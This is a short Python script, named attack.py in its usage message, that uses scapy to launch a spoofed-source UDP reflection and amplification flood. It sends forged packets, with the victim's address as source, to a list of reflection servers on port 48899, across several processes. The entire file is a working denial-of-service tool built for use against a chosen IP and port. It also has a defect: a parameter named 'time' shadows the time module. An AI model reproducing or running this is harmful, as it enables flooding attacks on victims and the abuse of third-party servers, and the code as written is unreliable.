import sys
import random
import time
import multiprocessing
from scapy.all import IP, UDP, send, Raw

with open("reflectionServers.txt", "r") as f:
    bots = f.readlines()

amplificationPayload = "\x00"
amplificationPort = 48899

def sendPacket(target_ip, port, time, size):
    target = (target_ip, int(port))
    start_time = time.time()
    bytes_per_sec = size * 1024 * 1024 / 8
    
    while time.time() - start_time < time:
        server = random.choice(bots)
        server = server.strip()
        try:
            packet = (
                IP(dst=server, src=target_ip)
                / UDP(sport=int(port), dport=amplificationPort)
                / Raw(load=amplificationPayload)
            )
            send(packet, verbose=False)
            time.sleep(len(packet) / bytes_per_sec)
        except Exception as e:
            print(e)

def main():
    if len(sys.argv) != 6:
        print("Usage: python3 attack.py <ip> <port> <time> <size> <threads>")
        sys.exit(1)

    threads = int(sys.argv[5])

    processes = []

    for _ in range(threads):
        mp = multiprocessing.Process(target=sendPacket, args=(sys.argv[1], sys.argv[2], int(sys.argv[3]), float(sys.argv[4])))
        mp.daemon = True
        processes.append(mp)
        mp.start()

    for mp in processes:
        mp.join()

if __name__ == "__main__":
    main()
